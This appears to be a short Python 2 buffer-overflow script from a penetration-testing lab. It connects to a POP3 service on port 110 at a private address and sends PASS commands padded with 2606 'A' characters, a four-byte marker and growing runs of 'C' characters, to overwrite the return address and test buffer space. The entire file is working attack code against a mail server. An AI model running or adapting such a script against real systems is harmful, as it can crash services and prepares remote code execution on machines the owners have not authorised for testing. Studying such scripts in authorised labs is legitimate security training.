#!/usr/bin/python

import socket

buffer = []
counter = 100
print "Generating strings..."
while len(buffer) <= 30:
	buffer.append("A" * 2606 + "i" * 4 + "C" * counter)
	counter += 200
print "Sending payload..."
for string in buffer:
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect = sock.connect(("10.11.15.76", 110))
		sock.send("USER test\r\n")
		sock.send("PASS " + string + "\r\n")
		sock.send("QUIT\r\n")
	finally:
		sock.close()
